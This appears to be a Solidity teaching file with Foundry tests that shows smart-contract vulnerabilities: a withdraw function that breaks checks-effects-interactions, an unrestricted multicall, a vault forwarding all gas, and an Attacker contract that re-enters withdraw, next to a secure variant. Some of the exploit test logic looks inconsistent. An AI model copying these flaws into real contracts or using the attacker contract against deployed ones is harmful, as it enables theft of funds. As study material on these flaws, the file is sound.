// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract ArbitraryCall {
    Vault public vault;
    address owner;

    mapping(address => uint256) public stakes;

    constructor() {
        vault = new Vault();
        owner = msg.sender;
    }

    function deposit() external payable {
        stakes[msg.sender] += msg.value;
        address(vault).call{value: msg.value}("");
    }

    function stake() external payable {
        // staking logic
        // increase
    }

    function withdraw() external {
        // CEI pattern VIOLATION
        // CHECK
        // EFFECT
        // INTERACTIONS
        uint256 amount = stakes[msg.sender];
        require(amount > 0, "No stake to withdraw");
        vault.withdraw(payable(msg.sender), amount);
        stakes[msg.sender] = 0;
    }

    function withdrawSecure() external {
        // CHECK
        uint256 amount = stakes[msg.sender];
        require(amount > 0, "No stake to withdraw");
        // state modification before external call
        // EFFECT
        stakes[msg.sender] = 0;
        // INTERACTIONS
        vault.withdraw(payable(msg.sender), amount);
    }

    // function depositAndStke() external payable {
    //     deposit();
    //     stake();
    // }

    function multicall(bytes[] calldata data, address target) external payable {
        for (uint i = 0; i < data.length; i++) {
            (bool success, ) = address(target).call{
                value: msg.value / data.length
            }(data[i]);
            require(success, "Call failed");
        }
    }

    function executeWithdraw(address payable to) external {
        require(msg.sender == owner, "Not owner");
        vault.withdraw(to, address(vault).balance);
    }

    //// more logic ////
}

contract Vault {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function withdraw(address payable to, uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        to.call{value: amount}(""); // forward all gas, vulnerable
    }

    receive() external payable {}
}

import {Test, console} from "forge-std/Test.sol";

contract ArbitraryCallTest is Test {
    ArbitraryCall arbitraryCall;
    address attacker;
    address user;

    function setUp() public {
        attacker = makeAddr("attacker");
        user = makeAddr("user");

        arbitraryCall = new ArbitraryCall();

        vm.deal(user, 10 ether);
    }

    function test_ArbitraryCall_Exploit() public {
        vm.prank(user);
        arbitraryCall.deposit{value: 1 ether}();

        // Craft malicious multicall data
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature("deposit()");
        calls[1] = abi.encodeWithSignature("stake()");

        // Attacker uses multicall to call deposit twice
        vm.prank(user);
        arbitraryCall.multicall{value: 1 ether}(calls, address(arbitraryCall));

        // Now attacker has staked 2 ether but only deposited 1 ether
        // Withdraw the funds
        vm.prank(attacker);
        vm.expectRevert();
        arbitraryCall.executeWithdraw(payable(attacker));

        bytes[] memory withdrawCall = new bytes[](1);
        withdrawCall[0] = abi.encodeWithSignature(
            "withdraw(address)",
            attacker
        );

        vm.prank(attacker);
        arbitraryCall.multicall(withdrawCall, address(arbitraryCall.vault()));

        // Check attacker's balance increased
        assert(address(attacker).balance > 1 ether);
    }

    function test_reentrancy() public {
        vm.prank(user);
        arbitraryCall.deposit{value: 1 ether}();

        Attacker reentrancyAttacker = new Attacker(address(arbitraryCall));

        reentrancyAttacker.deposit{value: 1 ether}();
        reentrancyAttacker.withdraw();
    }
}

contract Attacker {
    ArbitraryCall public arbitraryCall;

    constructor(address _arbitraryCall) {
        arbitraryCall = ArbitraryCall(_arbitraryCall);
    }

    function deposit() external payable {
        arbitraryCall.deposit{value: msg.value}();
    }

    function withdraw() external {
        arbitraryCall.withdraw();
    }

    receive() external payable {
        console.log("reenterd");

        if (address(arbitraryCall.vault()).balance >= 1 ether) {
            arbitraryCall.withdraw();
        }
    }
}
